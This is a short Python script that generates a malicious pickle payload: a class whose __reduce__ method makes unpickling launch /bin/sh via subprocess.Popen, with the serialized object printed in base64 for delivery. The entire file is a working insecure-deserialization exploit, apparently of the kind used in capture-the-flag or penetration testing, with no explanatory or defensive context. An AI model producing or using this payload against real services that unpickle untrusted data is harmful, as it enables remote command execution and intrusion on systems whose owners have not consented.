import pickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

print(base64.b64encode(pickle.dumps(RunBinSh())))